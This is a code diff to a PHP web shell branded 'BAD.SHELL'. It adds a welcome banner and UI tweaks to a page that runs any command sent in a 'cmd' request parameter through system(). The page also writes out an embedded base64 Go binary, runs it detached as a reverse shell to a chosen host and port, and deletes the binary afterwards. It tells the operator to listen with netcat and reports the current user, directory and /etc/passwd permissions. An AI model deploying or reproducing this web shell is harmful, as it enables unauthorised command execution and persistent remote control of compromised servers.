@@ -2,9 +2,9 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BAD.SHELL</title>
 </head>
 <body>
-
 <?php
 
 $goshell = "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAASJlKAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAD
@@ -12279,7 +12279,20 @@ SrrYHaPOBx8ATwAAMAsAABgAAAAOAAAAGgMAAG/9//+jt/9HPkgVcjlhUbWa4o8A5g0AABsAAAAO
 AAAAGgMAAG/9//+jt/9HPkgVcjlhUbiSKOY78IsA4AkAABcAAAAOAAAAGgMAAG/9//+jt/9HPkgV
 cjlhQonoDgAAAAAAVVBYIQAAAAAAAFVQWCENFg4K1VW36sJZaNfgCQAAFwAAAAAAIgBJHgAM9AAA
 AA==
-"
+";
+
+$logo = "
+██████╗  █████╗ ██████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
+██╔══██╗██╔══██╗██╔══██╗   ██╔════╝██║  ██║██╔════╝██║     ██║     
+██████╔╝███████║██║  ██║   ███████╗███████║█████╗  ██║     ██║     
+██╔══██╗██╔══██║██║  ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
+██████╔╝██║  ██║██████╔╝██╗███████║██║  ██║███████╗███████╗███████╗
+╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+";
+
+$version = "1.0";
+
+$shelladdr = $_SERVER['SERVER_ADDR'];
 
 ?>
 
@@ -12321,6 +12334,7 @@ body {
     top: 1%;
     line-height: 0px;
     left: 1%;
+    cursor: pointer;
 }
 
 #output {
@@ -12489,14 +12503,21 @@ pre {
     padding: 4%;
 }
 
+#panel .tool h2 {
+	all: unset;
+	padding-left: 1%;
+	line-height: 3em;
+	font-weight: bold;
+}
+
 </style>
 
 
 
 <!-- Web -->
 <div id="header">
-    <h1>BAD.SHELL</h1>
-    <pre><?php system('uname -a'); ?></pre>
+    <h1 class="home" onclick="gotohome()">BAD.SHELL</h1><form id="homereq" method="get"></form>
+    <pre><?php echo exec('uname -a'); echo(" // Shell Address: " . $_SERVER['SERVER_ADDR']); ?></pre>
     <ul>
         <li onclick="openPanel('panel-tools')">TOOLS</li>
         <li onclick="openPanel('panel-info')">INFO</li>
@@ -12507,12 +12528,28 @@ pre {
 
 <div id="output" onclick="closePanel()">
 <?php
+
+if (!isset($_REQUEST['cmd'])) {
+	global $logo;
+	global $version;
+	echo "<pre>";
+	echo "\n\n";
+	echo $logo;
+	echo "\n";
+	echo "Welcome to BAD.SHELL $version - A PHP Web Shell made with ♥";
+	echo "</pre>";
+}
+
+?>
+
+<?php
 if (isset($_REQUEST['cmd'])) {
     echo "<pre>";
     $cmd = ($_REQUEST['cmd']);
     system($cmd,$returnvar);
-    if ($returnvar != 0)
+    if ($returnvar != 0) {
         echo "Command Failed\nExit Status:$returnvar";
+    }
     echo "</pre>";
 }
 if ($_REQUEST['deploygo'] == 'RUN') {
@@ -12531,13 +12568,14 @@ if ($_REQUEST['deploygo'] == 'RUN') {
         $sh = NULL;
         echo "Change Executing Permissions\n";
         exec('chmod +x ./goshell');
-        echo "Executing GoShell\n";
+        echo "Executing GO.SHELL\n";
         $HOST = $_REQUEST['HOST'];
         $PORT = $_REQUEST['PORT'];
         exec("/bin/bash -c 'exec nohup setsid ./goshell -host=$HOST:$PORT > /dev/null 2>&1 &'");
         exec('rm -f ./goshell');
-        echo "Binary was removed... if process get kill'd, you need to RUN again!\n";
-        echo "Thank You for using GoShell v1.0.\n";
+        echo "Binary was removed... if process get kill'd, you need to RUN again!\n\n";
+        echo "Now you can start on your side [nc -lnvp $PORT]\n\n";
+        echo "Thank You for using GoShell v1.0! \n\n";
         return true;
     }
 
@@ -12569,7 +12607,7 @@ if ($_REQUEST['deploygo'] == 'RUN') {
     }
 
     echo "<pre>";
-    echo "######## GoShell v1.0 ########\n\n";
+    echo "######## GO.SHELL v1.0 ########\n\n";
     if (preflight()){
         deploy();
     }
@@ -12588,21 +12626,25 @@ if ($_REQUEST['deploygo'] == 'RUN') {
 <div id="panel" class="panel-tools">
 <h1>TOOLS</h1>
     <div class="tool">
-    <pre>Deploy GoShell -- start [nc -lvnp PORT] on your side!</br></pre>
+	<h2>GO.SHELL v1.0</h2>
+    <pre>Deploy a Golang Reverse Shell Binary.</br></pre>
     <pre>Set HOST and PORT then RUN</br></pre>
     <form method="get">
-        <input type="text" name="HOST" placeholder="HOST">
-        <input type="text" name="PORT" placeholder="PORT">
+        <input type="text" name="HOST" placeholder="HOST" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
+        <input type="text" name="PORT" placeholder="PORT" value="13337">
         <input type="submit" name="deploygo" value="RUN">
     </form>
     </div>
 </div>
 <div id="panel" class="panel-info">
     <h1>INFO</h1>
+    <pre>Local IP [browser]: <span class="info-cmd"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></pre>
+    <pre>Remote IP [shell]: <span class="info-cmd"><?php echo $_SERVER['SERVER_ADDR']; ?></span></pre>
     <pre>Current User [whoami]: <span class="info-cmd"><?php system(whoami); ?></span></pre>
     <pre>Current Dir [pwd]: <span class="info-cmd"><?php system(pwd); ?></span></pre>
     <pre>Current Dir Permissions: <span class="info-cmd"><?php system("stat -c '%U %G %A' ./"); ?></span></pre>
     <pre>/etc/passwd: <span class="info-cmd"><?php system('stat -c "%A" /etc/passwd'); ?></span></pre>
+    <pre>/tmp: <span class="info-cmd"><?php system('stat -c "%A" /tmp'); ?></span></pre>
 
 </div>
 
@@ -12623,6 +12665,11 @@ function closePanel(){
         currentPanel.style.right = '-50%'
     }
 }
+
+function gotohome(){
+	document.getElementById("homereq").submit();
+}
+
 </script>
 
 </body>
